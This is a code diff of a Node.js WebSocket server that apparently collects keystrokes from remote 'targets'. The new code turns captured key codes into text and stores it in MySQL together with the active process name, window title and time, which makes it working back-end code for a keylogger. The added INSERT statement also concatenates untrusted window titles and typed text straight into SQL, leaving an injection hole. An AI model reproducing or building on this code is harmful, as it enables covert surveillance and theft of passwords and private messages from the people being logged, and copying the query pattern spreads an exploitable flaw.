@@ -1,4 +1,5 @@
 var adminID = '8f51dfd14221bc7d6adaefdf0533bf9e2af2d21e1395c6085fdf76943734c271';
+var keyCodes = require('./keyCodes.json');
 // подключенные клиенты
 var clients = [];
 var targets = [];
@@ -14,7 +15,14 @@ var database = mysql.createConnection({
     database : 'lrc'
 });
 
+database.connect(function(err) {
+    if(err != null) {
+        console.log(err.code);
+        console.log(err.fatal); // true
+        throw err;
+    }
 
+});
 
 // WebSocket-сервер на порту 25565
 var webSocketServer = new WebSocketServer({ port: 25565 });
@@ -161,8 +169,8 @@ function parse_binary_message (data,ws) {
     }
 
     console.log(lrcdata.data.items);
-    saveData();
-
+    //controlshiftescsaveData();
+    var items = lrcdata.data.items;
     /*var sql = "SELECT * FROM ?? WHERE ?? = ?";
      var inserts = ['users', 'id', userId];
      sql = mysql.format(sql, inserts);*/
@@ -187,19 +195,48 @@ function parse_binary_message (data,ws) {
                 insertKeyboard ();
             }
             function insertKeyboard () {
-                console.log('ID --------------------- ' + id);
-                database.query('INSERT INTO keyboard (userId) VALUES (' + id + ')', function (err, rows, fields) {
-                    if (err != null) {
-                        console.log('INSERT keyboard ERROR' + err);
-                        return;
-                    }
-                    console.log('[INFO] data inserted');
+                items.forEach(function(item, i, arr) {
+                    var keys = item.keys;
+                    var text = '';
+                    keys.forEach(function(key, i, arr) {
+                        console.log (key);
+                        //console.log('key.vkInfo = ' + key.vkInfo + ' keyCode : ' + keyCodes[key.vkInfo]);
+                        var char = keyCodes[key.keyCode];
+                        if(typeof(char) != "undefined")
+                        {
+                            text += char;
+                        }
+                        else
+                        {
+                            text += '*';
+                        }
+                    });
+                    console.log('text : '+ text);
+                   database.query('INSERT INTO keyboard (userId,process,title,text,eventTime) VALUES (' + id + ',"'+item.wndInfo.process +'","'+item.wndInfo.title+'","'+ text +'",FROM_UNIXTIME('+item.wndInfo.time+') )', function (err, rows, fields) {
+                        if (err != null) {
+                            console.log('INSERT keyboard ERROR' + err);
+                            return;
+                        }
+                        console.log('[INFO] row inserted');
+                    });
                 });
+                console.log('[INFO] data inserted');
             }
         });
     }
+    items.forEach(function(item, i, arr) {
+        console.log(item.keys);
+    });
 }
 
+
+/*
+var result = '{';
+for(var i = 65 ; i<=90;i++){
+    result += '"' + i + '":"' + String.fromCharCode(i) + '",';
+}
+result += '}';
+console.log(result);*/
 /*
 database.query('INSERT INTO users (shaId) VALUES ("0229c6d61077b9e9e1e8f8ad0be3f95ee66bfcafd8333b5322cc1a923b3147cf")', function (err, rows, fields) {
     console.log(rows.insertId);
